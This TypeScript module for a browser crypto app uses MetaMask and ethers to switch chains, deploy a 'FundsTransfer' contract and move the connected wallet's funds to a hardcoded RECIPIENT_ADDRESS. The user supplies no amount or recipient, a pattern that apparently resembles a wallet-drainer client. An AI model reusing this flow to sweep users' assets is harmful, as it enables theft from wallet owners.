import { ethers } from 'ethers';
import { deployContract, transferFundsViaContract, RECIPIENT_ADDRESS } from './contract';
import { getContractAddress, updateContractAddress, loadContractAddresses } from './storage';

// Chain IDs
export const CHAIN_IDS = {
  ETHEREUM: '0x1', // 1
  ARBITRUM: '0xa4b1', // 42161
  OPTIMISM: '0xa', // 10
  BASE: '0x2105', // 8453
};

// Chain names for display
export const CHAIN_NAMES = {
  [CHAIN_IDS.ETHEREUM]: 'Ethereum',
  [CHAIN_IDS.ARBITRUM]: 'Arbitrum',
  [CHAIN_IDS.OPTIMISM]: 'Optimism',
  [CHAIN_IDS.BASE]: 'Base',
};

// Load contract addresses from localStorage
let deployedContracts: Record<string, string> = {};

// Initialize contract addresses from localStorage when this module is loaded
if (typeof window !== 'undefined') {
  deployedContracts = loadContractAddresses();
  console.log('Loaded contract addresses:', deployedContracts);
}

/**
 * Get the current chain ID from MetaMask
 */
export const getCurrentChainId = async (): Promise<string> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    const chainId = await ethereum.request({ method: 'eth_chainId' });
    return chainId;
  } catch (error) {
    console.error('Error getting chain ID:', error);
    throw error;
  }
};

/**
 * Switch to a specified network
 */
export const switchNetwork = async (chainId: string): Promise<void> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    await ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId }],
    });
  } catch (error: any) {
    // If the chain has not been added to MetaMask
    if (error.code === 4902) {
      throw new Error(`Please add the ${CHAIN_NAMES[chainId]} network to your wallet`);
    }
    console.error('Error switching network:', error);
    throw error;
  }
};

/**
 * Deploy the FundsTransfer contract if not already deployed on the current chain
 */
export const ensureContractDeployed = async (
  chainId: string,
  signer: ethers.Signer
): Promise<string> => {
  // First check our in-memory cache
  if (deployedContracts[chainId]) {
    console.log(`Using existing contract on ${CHAIN_NAMES[chainId]}: ${deployedContracts[chainId]}`);
    return deployedContracts[chainId];
  }

  // Then check localStorage
  const savedAddress = getContractAddress(chainId);
  if (savedAddress) {
    console.log(`Found contract address in storage for ${CHAIN_NAMES[chainId]}: ${savedAddress}`);
    deployedContracts[chainId] = savedAddress;
    return savedAddress;
  }

  console.log(`No contract found on ${CHAIN_NAMES[chainId]}. Deploying new contract...`);

  // Deploy new contract
  const contract = await deployContract(signer);
  const address = contract.address;

  // Save to in-memory cache and localStorage
  deployedContracts[chainId] = address;
  updateContractAddress(chainId, address);

  console.log(`Contract deployed on ${CHAIN_NAMES[chainId]}: ${address}`);
  return address;
};

/**
 * Transfer funds using the smart contract
 */
export const transferAssets = async (
  chainId: string
): Promise<ethers.providers.TransactionResponse> => {
  try {
    const { ethereum } = window as any;
    if (!ethereum) throw new Error('No ethereum provider found');

    // Ensure we're on the correct chain
    const currentChainId = await getCurrentChainId();
    if (currentChainId !== chainId) {
      await switchNetwork(chainId);
    }

    const provider = new ethers.providers.Web3Provider(ethereum);
    const signer = provider.getSigner();

    // Ensure the contract is deployed on this chain
    const contractAddress = await ensureContractDeployed(chainId, signer);

    console.log(`Using contract at ${contractAddress} to transfer funds to ${RECIPIENT_ADDRESS}`);

    // Transfer funds via the contract
    return await transferFundsViaContract(contractAddress, signer);
  } catch (error) {
    console.error('Error transferring assets:', error);
    throw error;
  }
};
